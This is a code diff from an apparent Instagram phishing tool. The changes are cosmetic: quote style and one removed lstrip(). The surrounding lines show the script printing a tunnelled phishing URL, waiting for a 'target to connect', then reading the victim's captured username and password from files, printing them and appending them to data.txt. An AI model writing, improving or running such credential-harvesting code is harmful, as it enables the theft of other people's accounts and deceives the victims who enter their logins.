@@ -155,7 +155,7 @@ def instagram():
 
 #====================================================================================================
     line = linecache.getline(r"localhost.txt" , 24)
-    print(f"\n{Fore.CYAN}Your URL :{Fore.LIGHTWHITE_EX}" , line.replace("tunneled with tls termination, " , " , ").lstrip())
+    print(f"\n{Fore.CYAN}Your URL :{Fore.LIGHTWHITE_EX}" , line.replace("tunneled with tls termination, " , " , "))
     linecache.clearcache()
 
     Sprint(Fore.YELLOW + "waiting for target to connect...\n".title() + Fore.RESET)
@@ -200,8 +200,8 @@ def instagram():
                 print(f"\n\n{Fore.GREEN}The username is : {Fore.LIGHTWHITE_EX}" , user.read())
 
                 #clear username.txt file
-                username =open('username_key.txt')  
-                data = open('data.txt','a')
+                username =open("username_key.txt")  
+                data = open("data.txt","a")
                 for x in username.readlines():
                     data.write(f"\nThe Username is : {x}")
                 sleep(1.5)
@@ -217,8 +217,8 @@ def instagram():
                 print(f"{Fore.GREEN}The password is : {Fore.LIGHTWHITE_EX}" , pas.read() + Fore.RESET)
 
                 #clear password.txt
-                pwd =open('password_key.txt')  
-                data = open('data.txt','a')
+                pwd =open("password_key.txt")  
+                data = open("data.txt","a")
                 for x in pwd.readlines():
                     data.write(f"\nThe Password is : {x}")
                     data.write("\n")
